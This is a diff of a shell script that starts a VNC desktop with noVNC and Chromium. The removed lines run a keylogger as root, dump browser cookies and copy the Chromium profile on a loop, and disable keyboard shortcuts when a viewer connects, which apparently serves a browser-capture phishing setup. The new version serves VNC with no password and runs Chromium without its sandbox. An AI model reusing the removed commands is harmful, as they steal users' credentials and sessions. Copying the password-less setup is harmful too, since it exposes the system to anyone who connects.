@@ -1,12 +1,88 @@
-/bin/bash -c /home/user/kiosk.sh &
-nohup /bin/bash -c "while true; do if netstat | grep 5900 | grep ESTABLISHED ; then xfconf-query -c xfce4-keyboard-shortcuts -p /commands -r -R; break; fi; done" &
-nohup /bin/bash -c "sudo python3 /home/user/keylogger.py &"
-nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &
-nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &
-sudo rm -f /tmp/.X${DISPLAY#:}-lock
-nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &
-while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done
-nohup startxfce4 > /dev/null || true &
-sudo rm -f ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml
-nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
-nohup /home/user/noVNC/utils/novnc_proxy --web /home/user/noVNC/ --vnc localhost:5900 --listen 5980
+#!/bin/bash
+set -e
+
+# startVNC.sh - starts Xvfb, x11vnc, noVNC/websockify and Chromium
+# Uses ENV RESOLUTION and USERAGENT from the container environment.
+
+DISPLAY="${DISPLAY:-:0}"
+
+# Choose X screen size
+if [ -n "$RESOLUTION" ]; then
+  SCREEN="$RESOLUTION"
+  echo "Using RESOLUTION from env: $SCREEN"
+else
+  SCREEN="1920x1080x24"
+  echo "No RESOLUTION set; using fallback: $SCREEN"
+fi
+
+# Ensure dbus machine-id exists
+if [ ! -f /var/lib/dbus/machine-id ]; then
+  dbus-uuidgen > /var/lib/dbus/machine-id || true
+fi
+
+# Start X virtual framebuffer
+echo "Starting Xvfb on $DISPLAY -screen 0 $SCREEN"
+Xvfb "$DISPLAY" -screen 0 "$SCREEN" &
+
+# small wait for X to come up
+sleep 1
+
+export DISPLAY
+
+# Start a lightweight session/window manager if available
+if command -v xfce4-session >/dev/null 2>&1; then
+  echo "Starting xfce4-session"
+  xfce4-session &>/dev/null &
+else
+  # try a minimal window manager if you prefer (openbox, etc.) - optional
+  echo "xfce4-session not found; continuing without full session"
+fi
+
+# Start x11vnc to serve the X display
+echo "Starting x11vnc (listening on 5900)"
+x11vnc -display "$DISPLAY" -nopw -forever -shared -rfbport 5900 &
+
+# Start noVNC / websockify if present
+if [ -d "$HOME/noVNC" ]; then
+  cd "$HOME/noVNC"
+  # Prefer bundled run script if present; otherwise fallback
+  if [ -x utils/websockify/run ]; then
+    echo "Starting websockify (bundled) to serve noVNC on 5980 -> localhost:5900"
+    ./utils/websockify/run --web . 5980 localhost:5900 &
+  else
+    # attempt to run python wrapper
+    echo "Starting websockify (python) to serve noVNC on 5980 -> localhost:5900"
+    python3 utils/websockify/run --web . 5980 localhost:5900 &
+  fi
+else
+  echo "noVNC not found at $HOME/noVNC; skipping web UI startup"
+fi
+
+# Build Chromium flags at runtime so USERAGENT and other envs can be used
+# Start with default flags as an array for safe handling
+CHROMIUM_ARGS=(--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --start-maximized --no-sandbox --password-store=basic --noerrdialogs --no-first-run)
+
+# If CHROMIUM_FLAGS env var is set, use it instead (split on spaces)
+if [ -n "${CHROMIUM_FLAGS}" ]; then
+  read -ra CHROMIUM_ARGS <<< "${CHROMIUM_FLAGS}"
+fi
+
+# Add USERAGENT at runtime if provided
+if [ -n "$USERAGENT" ]; then
+  CHROMIUM_ARGS+=("--user-agent=$USERAGENT")
+  echo "Using USERAGENT: $USERAGENT"
+fi
+
+# Optionally open a URL on start; otherwise leave desktop for manual use
+START_URL="${START_URL:-http://localhost:5980/vnc.html}"
+
+# Start Chromium
+if command -v chromium >/dev/null 2>&1; then
+  echo "Launching Chromium: $START_URL"
+  chromium "${CHROMIUM_ARGS[@]}" "$START_URL" &>/dev/null &
+else
+  echo "Chromium not found; skipping browser launch"
+fi
+
+# Wait (keep container running)
+wait
